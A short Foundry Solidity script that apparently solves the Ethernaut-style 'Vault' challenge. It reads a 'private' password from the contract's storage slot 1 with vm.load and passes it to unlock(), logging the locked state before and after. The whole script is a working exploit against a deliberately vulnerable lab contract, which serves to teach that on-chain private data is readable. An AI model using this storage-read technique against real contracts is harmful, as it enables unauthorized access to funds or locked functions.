// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Vault.sol";

contract VaultSolution is Script {
    Vault public vaultInstance = Vault(<Contract_address>);  

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Before unlock, Locked:", vaultInstance.locked());

        // Password read from storage slot 1
        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));

        // Unlock with password
        vaultInstance.unlock(password);

        console.log("After unlock, Locked:", vaultInstance.locked());

        vm.stopBroadcast();
    }
}